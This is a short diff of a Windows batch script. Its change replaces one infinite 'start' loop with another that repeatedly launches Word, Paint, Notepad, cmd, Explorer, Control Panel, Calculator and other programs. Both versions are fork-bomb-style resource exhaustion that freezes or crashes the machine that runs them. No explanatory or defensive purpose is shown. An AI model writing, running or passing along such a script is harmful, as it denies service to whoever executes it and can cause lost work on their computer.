@@ -1,7 +1,11 @@
 @echo off
-:l
-start
-start 
-start 
-start
-goto:l
+:loop
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto :loop 
